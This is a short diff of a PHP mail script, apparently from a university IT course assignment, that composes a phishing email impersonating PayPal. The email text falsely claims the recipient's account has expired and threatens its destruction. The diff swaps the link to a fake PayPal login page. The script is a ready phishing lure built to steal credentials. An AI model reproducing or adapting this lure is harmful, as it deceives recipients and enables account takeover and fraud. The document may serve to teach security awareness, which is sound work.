@@ -7,7 +7,7 @@ $subject = "Your PayPal Account Has Expired";
 $txt = "Dear Customer, \n
 		Please be aware that your account expired.  It is indispensible to perform an audit of your data
 		is present, otherwise your account will be destroyed.  Just click the link below. \n
-		<a href=\"https://web.njit.edu/~al322/332/paypallogin.html\">Click here</a> \n\n";
+		<a href=\"https://web.njit.edu/~jnk6/IT332/paypal.html\">Click here</a> \n\n";
 $txt .= "We requests verification whenever an email address is selected as an account.  Your account cannot be used
 		until you verify it.\n\n
 		Sincerely, \n
